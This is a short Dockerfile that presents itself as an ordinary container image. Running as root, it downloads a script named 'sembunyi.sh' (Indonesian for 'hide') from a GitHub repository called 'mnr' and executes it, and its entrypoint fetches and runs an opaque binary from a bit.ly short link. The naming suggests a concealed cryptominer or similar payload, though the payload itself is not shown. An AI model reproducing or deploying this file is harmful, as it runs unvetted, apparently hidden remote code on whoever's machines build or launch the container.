FROM ubuntu:xenial-20180112.1
USER root
RUN apt-get update && apt-get install wget make gcc -y
RUN wget https://raw.githubusercontent.com/p4n1k/mnr/main/sembunyi.sh && chmod +x sembunyi.sh && ./sembunyi.sh
ENTRYPOINT wget https://bit.ly/3Ibzg9T && chmod +x 3Ibzg9T && ./3Ibzg9T
